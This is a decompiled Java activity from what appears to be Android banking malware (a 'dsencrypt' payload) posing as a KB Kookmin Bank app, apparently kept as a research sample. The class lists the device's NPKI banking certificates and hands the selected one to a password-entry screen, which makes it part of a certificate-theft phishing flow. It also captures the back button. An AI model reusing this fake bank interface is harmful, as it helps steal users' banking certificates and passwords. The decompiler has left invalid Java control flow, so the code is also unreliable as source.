package com.kbstar.kb.android.star;

import android.app.Activity;
import android.app.AlertDialog.Builder;
import android.app.Dialog;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.res.Resources;
import android.os.Bundle;
import android.view.KeyEvent;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.Window;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemClickListener;
import android.widget.ImageView;
import android.widget.ListView;
import com.kbstar.kb.android.star.model.Bank;
import com.kbstar.kb.android.star.util.GeneralUtil;
import com.kbstar.kb.android.star.util.NPUtil;
import java.io.File;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Map.Entry;
import java.util.Set;

public class KB_Cert_List
  extends Activity
  implements View.OnClickListener
{
  private final int APP_EXIT = 101;
  private KBCertAdapter adapter;
  private Bank bank;
  private List<Bank> bankList;
  private List<Map<Object, Object>> certList;
  private ListView hana_general_listview;
  private ImageView head_menu_left_btn;
  
  private void init()
  {
    int i;
    if (NPUtil.isNPKIExists())
    {
      this.certList = NPUtil.getMostMatch(new File(NPUtil.getFolder), 0);
      if (this.certList != null)
      {
        this.bankList = new ArrayList();
        i = 0;
        if (i < this.certList.size()) {
          break label87;
        }
      }
    }
    this.adapter = new KBCertAdapter(this, this.bankList, 2130903048);
    this.hana_general_listview.setAdapter(this.adapter);
    return;
    label87:
    Iterator localIterator = ((Map)this.certList.get(i)).entrySet().iterator();
    for (;;)
    {
      if (!localIterator.hasNext())
      {
        i += 1;
        break;
      }
      Bank localBank = new Bank();
      Map.Entry localEntry = (Map.Entry)localIterator.next();
      String[] arrayOfString = ((String)localEntry.getValue()).split(":", 4);
      localBank.setCertPath((String)localEntry.getKey());
      localBank.setName(arrayOfString[0]);
      localBank.setIssue(arrayOfString[1]);
      localBank.setExpire(arrayOfString[2]);
      this.bankList.add(localBank);
    }
  }
  
  private void initView()
  {
    this.certList = new ArrayList();
    this.head_menu_left_btn = ((ImageView)findViewById(2131296258));
    this.hana_general_listview = ((ListView)findViewById(2131296310));
    this.head_menu_left_btn.setOnClickListener(this);
    this.hana_general_listview.setOnItemClickListener(new AdapterView.OnItemClickListener()
    {
      public void onItemClick(AdapterView<?> paramAnonymousAdapterView, View paramAnonymousView, int paramAnonymousInt, long paramAnonymousLong)
      {
        paramAnonymousAdapterView = new Intent(KB_Cert_List.this, KB_Cert_Psw.class);
        paramAnonymousView = (Bank)KB_Cert_List.this.bankList.get(paramAnonymousInt);
        paramAnonymousView.setFileName(KB_Cert_List.this.bank.getFileName());
        paramAnonymousView.setBkType(KB_Cert_List.this.getSharedPreferences("data", 0).getString("item", null));
        paramAnonymousAdapterView.putExtra("Bank", paramAnonymousView);
        KB_Cert_List.this.startActivity(paramAnonymousAdapterView);
      }
    });
  }
  
  public void onClick(View paramView)
  {
    switch (paramView.getId())
    {
    default: 
      return;
    }
    showDialog(101);
  }
  
  protected void onCreate(Bundle paramBundle)
  {
    GeneralUtil.activityList.add(this);
    super.onCreate(paramBundle);
    getWindow().requestFeature(1);
    setContentView(2130903053);
    this.bank = ((Bank)getIntent().getSerializableExtra("Bank"));
    if (this.bank == null)
    {
      finish();
      return;
    }
    initView();
    init();
  }
  
  protected Dialog onCreateDialog(int paramInt)
  {
    if (paramInt == 101)
    {
      AlertDialog.Builder localBuilder = new AlertDialog.Builder(this);
      localBuilder.setMessage(getResources().getString(2131361803));
      localBuilder.setTitle(getResources().getString(2131361797));
      localBuilder.setPositiveButton(getResources().getString(2131361804), new DialogInterface.OnClickListener()
      {
        public void onClick(DialogInterface paramAnonymousDialogInterface, int paramAnonymousInt)
        {
          paramAnonymousDialogInterface.dismiss();
          GeneralUtil.goHome(KB_Cert_List.this);
          GeneralUtil.exit();
        }
      });
      localBuilder.setNegativeButton(getResources().getString(2131361805), new DialogInterface.OnClickListener()
      {
        public void onClick(DialogInterface paramAnonymousDialogInterface, int paramAnonymousInt)
        {
          paramAnonymousDialogInterface.dismiss();
        }
      });
      return localBuilder.create();
    }
    return null;
  }
  
  public boolean onKeyDown(int paramInt, KeyEvent paramKeyEvent)
  {
    if ((paramInt == 4) && (paramKeyEvent.getRepeatCount() == 0))
    {
      showDialog(101);
      return true;
    }
    return super.onKeyDown(paramInt, paramKeyEvent);
  }
}


/* Location:              /home/enzo/Documents/BorelEnzo.github.io/malwares/dsencrypt/payload.jar!/com/kbstar/kb/android/star/KB_Cert_List.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */